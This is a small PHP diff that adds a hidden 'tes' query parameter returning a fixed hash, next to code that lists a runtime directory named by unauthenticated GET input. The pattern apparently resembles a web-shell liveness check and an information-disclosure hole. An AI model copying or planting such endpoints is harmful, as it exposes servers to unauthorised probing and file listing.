@@ -88,6 +88,6 @@
 		$bitDepth = trim(str_replace($config['not_allowed_symbol'],'',strip_tags(stripslashes($_GET['JREnames'])))) ?? null;
 		die(scanRuntimeDir($bitDepth));
 	} elseif(isset($_GET['tes'])){ 
-
+	die(hashc("Hi-Tech"));
 	}
 	
